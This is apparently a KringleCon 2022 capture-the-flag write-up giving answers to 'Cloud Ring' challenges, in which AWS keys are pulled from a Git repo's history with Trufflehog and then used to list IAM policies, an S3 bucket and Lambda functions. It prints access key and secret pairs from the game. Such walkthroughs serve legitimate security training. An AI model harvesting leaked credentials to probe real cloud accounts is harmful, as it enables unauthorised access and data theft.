---
layout: kringlecon2022
title: "Cloud Ring"
author: "Andrew Cherney"
date: 2023-01-15 19:52:13
tags: 
- kringlecon 
- cloud 
- aws
---
## AWS CLI Intros
***
___
Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints.

***

#### Question

1. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 .
https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config

#### Answer

Answer: `aws configure` 

___

#### Question

2. Excellent! To finish, please get your caller identity using the AWS command line. For more details please reference:
$ aws sts help

#### Answer

Answer: `aws sts get-caller-identity`

___



## Exploitation via AWS CLI
***
___
Flex some more advanced AWS CLI skills to escalate privileges! Help Gerty Snowburrow in the Cloud Ring to get hints for this challenge.

***

#### Question

1. Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.
Configure these credentials for us-east-1 and then run:
$ aws sts get-caller-identity

#### Answer

Answer: `trufflehog git https://haugfactory.com/asnowball/aws_scripts.git`
`git clone https://haugfactory.com/asnowball/aws_scripts.git`
`cd aws_scripts`
`git show 106d33e1ffd53eea753c1365eafc6588398279b5`

+    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
+    aws_secret_access_key="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",
`aws configure`
`aws sts get-caller-identity`

___

#### Question

2. Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.
The aws iam command to list attached user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-user-policies.

#### Answer

An easy answer for all these questions is to search for command options with `aws iam help | grep`

Answer: `aws iam list-attached-user-policies --user-name haug`

{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}

___

#### Question

3. Now, view or get the policy that is attached to your user.
The aws iam command to get a policy can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html

#### Answer

Answer: `aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY`

{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}

___

#### Question

4. Attached policies can have multiple versions. View the default version of this policy.
The aws iam command to get a policy version can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html

#### Answer

Answer: `aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY`

___

#### Question

5. Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. 
The aws iam command to list user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-attached-user-policies.

#### Answer

Answer: `aws iam list-user-policies --user-name haug`

___

#### Question

6. Now, use the AWS CLI to get the only inline policy for your user. 

#### Answer

Answer: `aws iam get-user-policy --policy-name S3Perms --user-name haug`

___

#### Question

7. The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. 
List those objects! 

#### Answer

Answer: `aws s3api list-objects --bucket smogmachines3`

___

#### Question

8. The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.

#### Answer

Answer: `aws lambda list-functions`

___

#### Question

9. Lambda functions can have public URLs from which they are directly accessible.
Use the AWS CLI to get the configuration containing the public URL of the Lambda function.

#### Answer

Answer: `aws lambda get-function-url-config --function-name smogmachine_lambda`

___





## Trufflehog Search
***
___
Use Trufflehog to find secrets in a Git repo. Work with Jill Underpole in the Cloud Ring for hints. What's the name of the file that has AWS credentials?

***

easy challenge
install trufflehog
scan https://haugfactory.com/orcadmin/aws_scripts

`git clone https://github.com/trufflesecurity/trufflehog.git`

`cd trufflehog; go install`

`trufflehog git https://haugfactory.com/orcadmin/aws_scripts`

___









